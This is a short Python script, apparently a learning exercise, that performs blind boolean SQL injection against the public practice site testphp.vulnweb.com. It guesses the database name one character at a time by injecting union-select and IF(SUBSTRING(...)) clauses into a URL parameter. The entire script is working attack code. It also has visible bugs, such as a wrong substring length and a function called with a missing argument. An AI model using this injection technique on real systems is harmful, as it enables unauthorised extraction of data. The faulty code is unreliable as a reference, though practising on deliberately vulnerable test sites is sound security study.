# How to make http request
import requests as req
import string

comprobador = "Si esite"

def requestador(letra,busqueda,numero):
    urlCrafteado = "http://testphp.vulnweb.com/artists.php?artist=1 and 1=0 union select 1,IF(SUBSTRING(" + busqueda + ","+ str(numero) + ","+str(numero)+") = \"" + letra + "\", \"Si esite\", \"NO esite\"),3"
    r = req.get(urlCrafteado)
    print(urlCrafteado)
    return r.text



def ysisi(webpage):

    res = webpage.find(comprobador)

    if res != -1:
        return True
    return False

def main():
    res = ysisi(requestador('b',"database()",1))
    print(res)


def takataka():
    dictionary = string.ascii_lowercase
    result = ""

    for item in dictionary:
        siono = ysisi(requestador(item, comprobador))
        if siono:
            result += item
        # ysisi

    print(result)


main()
